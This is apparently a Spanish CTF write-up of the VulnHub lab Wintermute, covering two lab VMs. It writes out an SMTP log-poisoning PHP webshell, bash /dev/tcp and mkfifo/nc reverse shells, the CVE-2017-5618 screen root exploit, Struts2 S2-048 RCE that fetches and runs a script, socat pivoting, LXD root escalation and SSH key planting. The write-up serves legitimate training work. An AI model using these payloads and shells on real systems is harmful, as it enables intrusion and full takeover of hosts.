---
title: "Wintermute"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, smtp, log poisoning, LFI, RCE, default credentials, ntopng, pivoting, port forwarding, SUID, screen, cve-2017-5618, tomcat, struts2, cve-2017-9791, lxd, privilege escalation, html entity encoding, arp-scan, nmap, whatweb, curl, netcat, searchsploit, socat, python, ssh, scp, lxc]
image:
  path: /assets/img/VulnHub/Wintermute/banner.webp
  lqip: "data:image/webp;base64,UklGRnwAAABXRUJQVlA4IHAAAABwBQCdASogACAAPu1kqU2ppaQiMAgBMB2JZwDE6f/gPJA9O75lgXfone9VSQbHrUauvYwAAP7ugKlbHM7xdvE7XqXHhi85b5v0o93+Ehjzw70+JCQpVhoVeVi6ZhkAJ1gC5dEyRRiMfBH8ARXAVYAA"
  alt: Wintermute writeup
attack_path: false
---

Wintermute es una máquina Medium de **VulnHub** (de mi laboratorio autohospedado del eJPTv2) y la primera de esta serie que exige **pivoting** de verdad: en realidad son *dos* máquinas Linux, y la segunda solo existe en una red interna accesible a través de la primera. En **straylight** una LFI alimenta un ataque de **log poisoning** por SMTP — una webshell PHP entregada dentro de un email enviado a mano con `netcat` — para una shell de `www-data`, y luego un `screen 4.5.0` SUID (**CVE-2017-5618**) da root. Desde ahí uso `socat` para tunelizar hacia la red `10.0.0.0/24`, exploto **Struts2 S2-048** (**CVE-2017-9791**) en **neuromancer**, y termino con una escalada de privilegios por el **grupo LXD** a root en el segundo host. El pivoting es el corazón de esta máquina, así que es lo que más detalle recibe.

| Campo      | Detalles       |
|------------|----------------|
| Plataforma | VulnHub        |
| Dificultad | Medium         |
| SO         | Linux          |
| Máquinas   | straylight (192.168.57.6) → neuromancer (10.0.0.101, interna) |
| Descarga   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Fecha      | Octubre 2026   |

## Herramientas Usadas

| Herramienta | Descripción                                                           |
|-------------|-----------------------------------------------------------------------|
| arp-scan    | Descubrió los hosts del laboratorio en la red host-only              |
| nmap        | Escaneo de puertos, directo y a través del pivot                     |
| whatweb     | Fingerprinting web (ntopng, Tomcat)                                  |
| curl        | Manejó la LFI y disparó la webshell                                  |
| netcat (nc) | Envió a mano el email SMTP del log poisoning, y los listeners        |
| searchsploit| Localizó los exploits de `screen` y Struts2                         |
| socat       | El pivot — reenvío de puertos straylight ↔ red interna               |
| Python      | Transferencias con `http.server`, el exploit S2-048, decode de HTML  |
| ssh / scp   | Acceso estable y transferencia de ficheros a través del pivot        |
| lxc         | Escalada de privilegios por contenedor LXD en neuromancer            |

## Montaje del Laboratorio

Todas las VMs corren en VirtualBox con dos redes: un adaptador **host-only** (`vboxnet1`, `192.168.57.0/24` — mi host es el `.1`) que alcanza a la primera máquina, y una red **interna** (`intnet`, `10.0.0.0/24`, DHCP) que solo ven las VMs. Esa red interna es toda la clave — la segunda máquina vive ahí, invisible desde mi host hasta que tunelizo a través de la primera. Un `arp-scan` por el lado host-only encuentra a straylight en **192.168.57.6**:

```bash
sudo arp-scan -I vboxnet1 --localnet
# 192.168.57.6   08:00:27:20:83:27   PCS Systemtechnik GmbH   (straylight)
```

# Máquina 1 — Straylight (192.168.57.6)

## Reconocimiento y Enumeración

```bash
sudo nmap -p- -sCV 192.168.57.6 -oN nmap
```

```bash
PORT     STATE SERVICE  VERSION
25/tcp   open  smtp     Postfix smtpd   (hostname: straylight; VRFY activado)
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))   (title: Night City)
3000/tcp open  http     ntopng   (title: Welcome to ntopng)
```

Tres servicios: **SMTP** (Postfix), un sitio Apache, y **ntopng** (un monitor de tráfico de red) en el 3000. ntopng viene con credenciales por defecto conocidas — **`admin:admin`** funciona — y dentro de su dashboard de tráfico (`flows_stats.lua`) hay un flujo revelador: una petición local a `http://127.0.0.1:80/turing-bolo/`. Esa es una ruta que nunca habríamos encontrado con fuzzing, nos la entrega la propia herramienta de monitorización.

### La LFI en turing-bolo

`/turing-bolo/bolo.php` toma un parámetro **`bolo`** que selecciona qué log de actividad mostrar — lee la ruta dada y la renderiza. Darle una ruta absoluta lo convierte en una **Local File Inclusion**. El fichero más útil al que apuntar es el log de correo de Postfix, porque podemos *escribir* en ese log remotamente enviando correo:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail'
# ... renderiza el log de correo de Postfix completo en la página ...
```

Crucialmente, `bolo.php` **incluye** el fichero como PHP, no solo lo imprime — así que si conseguimos meter código PHP *dentro* de un fichero que lee, ese código se ejecuta.

## Acceso Inicial — Log Poisoning por SMTP → RCE como `www-data`

### Envenenar el log de correo con netcat

Esta es la técnica clave: Postfix registra el **asunto** de cada correo que procesa en `/var/log/mail`. Si el asunto contiene PHP, ese PHP acaba en el log — que `bolo.php` luego ejecuta. Así que hablo SMTP a mano con `netcat` y pongo una webshell en la línea del asunto:

```bash
nc -nv 192.168.57.6 25
```

```text
220 straylight ESMTP Postfix (Debian/GNU)
HELO ander
250 straylight
mail from: ander@ander.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <pre> <?php system($_GET['cmd']); ?> </pre>
data2
.
250 2.0.0 Ok: queued as 9AB7F2DDA
```

Paso a paso: `HELO` abre la sesión, `mail from:` / `rcpt to:` fijan un remitente (desechable) y un destinatario local válido (`root`), `data` empieza el mensaje, la línea **`subject:`** lleva el payload PHP, una línea de cuerpo, y un único `.` en su propia línea termina el mensaje. Postfix lo acepta y lo encola — y escribe ese asunto en el log de correo.

Ahora el log contiene `<?php system($_GET['cmd']); ?>`. Pedir el log a través de `bolo.php` lo ejecuta, y el parámetro `cmd` se convierte en ejecución de comandos arbitraria:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=id'
# ... la página ahora muestra: uid=33(www-data) gid=33(www-data) ...
```

### Reverse shell

Con el RCE confirmado, codifico en URL una reverse shell de Bash en el parámetro `cmd` (`%20`=espacio, `%26`=`&`, `%2F`=`/`) y la recibo:

```bash
# listener
nc -nlvp 4444
```

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.1%2F4444%200%3E%261%27'
```

```bash
Connection received on 192.168.57.6 42208
www-data@straylight:/var/www/html/turing-bolo$
```

Una shell como **`www-data`**; tras el habitual tratamiento de la TTY, a por la escalada.

## Escalada de Privilegios — SUID `screen 4.5.0` (CVE-2017-5618) → root

La búsqueda de SUID devuelve un binario muy concreto y muy antiguo:

```bash
www-data@straylight:/$ find / -perm -4000 2>/dev/null
/bin/screen-4.5.0
```

**GNU Screen 4.5.0** es vulnerable a **CVE-2017-5618** — maneja mal una ruta de logfile suministrada por el usuario mientras tiene privilegios de root, permitiendo a un atacante escribir un `/etc/ld.so.preload` propiedad de root y cargar una librería compartida maliciosa en un proceso root. Exploit-DB trae un script ya hecho (41154):

```bash
searchsploit -m linux/local/41154.sh
python3 -m http.server       # servirlo desde el host
```

```bash
www-data@straylight:/tmp$ curl -s http://192.168.57.1:8000/privEsc.sh -o privEsc.sh
www-data@straylight:/tmp$ chmod +x privEsc.sh && ./privEsc.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
# whoami
root
# cat /root/flag.txt
REDACTED
```

Root en straylight. `/root/note.txt` es la miga de pan del pivot — menciona a una usuaria **Lady 3Jane**, una app Java a medida en el servidor de **Neuromancer**, y un despliegue de Tomcat en **`/struts2_2.3.15.1-showcase`**, en una *red interna de administración*.

## Pivoting hacia la Red Interna

### Una segunda interfaz

Ya como root en straylight, sus interfaces revelan el doble alojamiento que hace de esta máquina un laboratorio de pivot — está en la red host-only *y* en una interna `10.0.0.0/24`:

```bash
root@straylight:/$ ip a
# enp0s3: inet 192.168.57.6/24   (accesible desde mi host)
# enp0s8: inet 10.0.0.100/24     (red solo interna)
```

Mi host no puede rutar a `10.0.0.0/24`; straylight es el único puente. Un barrido de ping desde straylight encuentra un vecino:

```bash
root@straylight:/$ for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.100 up   (la propia straylight)
# 10.0.0.101 up   (neuromancer)
```

Un escaneo rápido de puertos con Bash `/dev/tcp` de **10.0.0.101** (no hay nmap en la máquina) muestra tres puertos:

```bash
# 8009 (ajp13)   8080 (Tomcat)   34483 (SSH)
```

### socat: reenviar los servicios internos hacia fuera

Aquí está el núcleo del pivot. straylight puede alcanzar a neuromancer; mi host puede alcanzar a straylight; así que hago que **straylight retransmita** cada puerto de neuromancer de vuelta hacia mi lado. `socat tcp-listen:<puerto>,fork tcp-connect:10.0.0.101:<puerto>` hace que straylight escuche en un puerto (en su interfaz `192.168.57.6`, entre otras) y reenvíe cada conexión a neuromancer:

```bash
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

Ahora, desde mi host, pegarle a `192.168.57.6:8080` en realidad alcanza al **Tomcat de neuromancer** — puedo escanear y explotar la máquina oculta como si fuera local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

# Máquina 2 — Neuromancer (10.0.0.101)

## Explotación — Struts2 S2-048 (CVE-2017-9791)

La nota de straylight apuntaba a `/struts2_2.3.15.1-showcase`. Apache Struts 2.3.x Showcase es vulnerable a **S2-048 / CVE-2017-9791** — una inyección OGNL en el plugin de integración de Struts 1 que da RCE. Exploit-DB 42324 lo automatiza:

```bash
searchsploit -m multiple/webapps/42324.py
```

### El doble pivot para la reverse shell

Hay una segunda mitad, más difícil, del túnel. El exploit ejecuta *comandos* en neuromancer, pero neuromancer solo puede alcanzar `10.0.0.x` — **no** a mi host en `192.168.57.1`. Así que una reverse shell tiene que rebotar también a través de straylight. Monto un relay *inverso* en straylight: escuchar en su IP interna y reenviar a mi host.

```bash
# en straylight: interna :5555  →  mi host 192.168.57.1:5555
root@straylight:/tmp$ socat tcp-listen:5555,reuseaddr,fork tcp-connect:192.168.57.1:5555 &
```

Un test de conectividad confirma el camino (neuromancer → straylight:5555 → host): el exploit S2-048 hace que neuromancer haga `curl` a la IP interna de straylight, y llega al servidor Python de mi host:

```bash
python3 exploit.py http://192.168.57.6:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action 'curl http://10.0.0.100:5555/'
# en el host:  python3 -m http.server 5555  →  "GET / HTTP/1.1" 200
```

Un one-liner `bash -i >& /dev/tcp/...` plano no funcionó, así que preparé una reverse shell con `mkfifo`: alojar el script en straylight (puerto 9999), hacer que el exploit lo descargue, le dé `chmod` y lo ejecute, con el callback apuntado a `10.0.0.100:5555` (que retransmite a mi host):

```bash
# reverseShell.sh:  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.100 5555 >/tmp/f
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'curl http://10.0.0.100:9999/reverseShell.sh -o /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'chmod +x /tmp/reverseShell.sh'
python3 exploit.py http://192.168.57.6:8080/.../saveGangster.action 'sh /tmp/reverseShell.sh'
```

```bash
# listener en el host
nc -nlvp 5555
Connection received on 192.168.57.6 54128
$ whoami
ta
$ hostname -I
10.0.0.101
```

Una shell como **`ta`** en neuromancer, tunelizada a través de dos saltos de socat.

### Acceso estable por SSH

Las reverse shells a ciegas son frágiles, así que monto SSH por clave a través del pivot. Primero reapunto el relay de SSH a un puerto local más amable (22 → el 34483 de neuromancer), luego añado mi clave al `authorized_keys` de `ta` y conecto:

```bash
root@straylight:/tmp$ socat tcp-listen:22,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

```bash
ta@neuromancer:~$ ssh-keygen
ta@neuromancer:~$ echo "<clave pública de mi host>" > /home/ta/.ssh/authorized_keys
```

```bash
ssh -i id_rsa ta@192.168.57.6    # → neuromancer, vía el relay 22→34483
ta@neuromancer:~$ id
uid=1000(ta) ... groups=1000(ta),...,110(lxd),...
```

## Escalada de Privilegios — grupo LXD → root

`ta` es miembro del grupo **`lxd`**, y eso es efectivamente root: LXD permite a un miembro del grupo crear contenedores, y un contenedor *privilegiado* puede montar el **sistema de ficheros del host** y entrarse como root. La ruta estándar es una imagen mínima de Alpine (construida con [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder)), copiada con `scp` a través del pivot SSH:

```bash
scp -i ~/.ssh/id_rsa alpine.tar.gz ta@192.168.57.6:/tmp/alpine.tar.gz
```

Luego la importamos, lanzamos un contenedor **privilegiado** con el `/` del host montado dentro, y caemos en una shell:

```bash
ta@neuromancer:/tmp$ lxc image import /tmp/alpine.tar.gz
ta@neuromancer:/tmp$ lxc image alias create privesc <fingerprint>
ta@neuromancer:/tmp$ lxc init privesc escalada -c security.privileged=true
ta@neuromancer:/tmp$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true
ta@neuromancer:/tmp$ lxc start escalada
ta@neuromancer:/tmp$ lxc exec escalada /bin/sh
~ # whoami
root
```

Dentro del contenedor somos root, y todo el disco del host está montado en `/mnt/root` — así que el `/root` del host es nuestro. Leo la flag y dejo mi clave en el `authorized_keys` de root para conseguir una sesión SSH de root limpia en el host:

```bash
~ # cat /mnt/root/root/flag.txt
REDACTED
~ # echo "<clave pública de mi host>" > /mnt/root/root/.ssh/authorized_keys
```

```bash
ssh -i .ssh/id_rsa root@192.168.57.6
root@neuromancer:~# whoami
root
```

Root en ambas máquinas — la máquina está completa.

### Extra — caza de credenciales

Un barrido de los ficheros de configuración de neuromancer saca varios secretos guardados que merece la pena anotar. El `settings.xml` de Maven tiene `proxyuser:proxypass` y `repouser:repopwd`, y el `tomcat-users.xml` de Tomcat esconde la contraseña de **Lady3Jane** tras entidades HTML (la idea del autor de "seguridad por oscuridad"):

```bash
ta@neuromancer:~$ python3 -c 'import html; print(html.unescape("&gt;&#33;&#88;&#120;&#51;&#74;&#97;&#110;&#101;&#120;&#88;&#33;&lt;"))'
# >!Xx3JanexX!<
ta@neuromancer:~$ su lady3jane      # funciona
```

## Flags

| Flag         | Host        | Ubicación   | Valor      |
|--------------|-------------|-------------|------------|
| `flag.txt`   | straylight  | `/root/`    | `REDACTED` |
| `flag.txt`   | neuromancer | `/root/`    | `REDACTED` |

## Conclusiones Clave

- **Las herramientas de monitorización filtran estructura interna.** ntopng con `admin:admin` no solo concedió un login — su dashboard de tráfico reveló el endpoint interno `turing-bolo` que era toda la superficie de ataque web. Las credenciales por defecto en una herramienta de observabilidad le entregan a un atacante un mapa del host.
- **El log poisoning por SMTP es el compañero clásico de la LFI.** Cuando una LFI *incluye* un fichero como código y puedes escribir en un log (correo, SSH, Apache), tienes RCE. Enviar el payload a mano por `netcat` — PHP en el `subject:` del correo — es una técnica que conviene dominar; no necesita subida, solo un destinatario válido.
- **El pivoting es solo retransmitir conexiones, en ambas direcciones.** `socat tcp-listen:X,fork tcp-connect:host:X` reenvió los servicios de neuromancer *hacia fuera* para poder atacarlos, y un segundo relay reenvió una reverse shell *hacia dentro* de vuelta a mi host. Tener claras las dos direcciones — quién puede alcanzar a quién — es toda la habilidad.
- **Encadena exploits a través del túnel.** Struts2 S2-048 es un RCE de un disparo, pero entregar una reverse shell funcional por un doble pivot requirió preparar un script con `mkfifo` y apuntar cada callback al relay (`10.0.0.100`), nunca al host inalcanzable. En redes segmentadas, el exploit es la parte fácil; el enrutado de la shell es el trabajo.
- **El grupo `lxd` es root.** La pertenencia a `lxd` dejó a `ta` montar el `/` del host en un contenedor privilegiado y leerlo/escribirlo como root — sin exploit de kernel. `lxd`, `docker`, `disk` y grupos similares son escalada de privilegios por diseño; trátalos como equivalentes a acceso root.
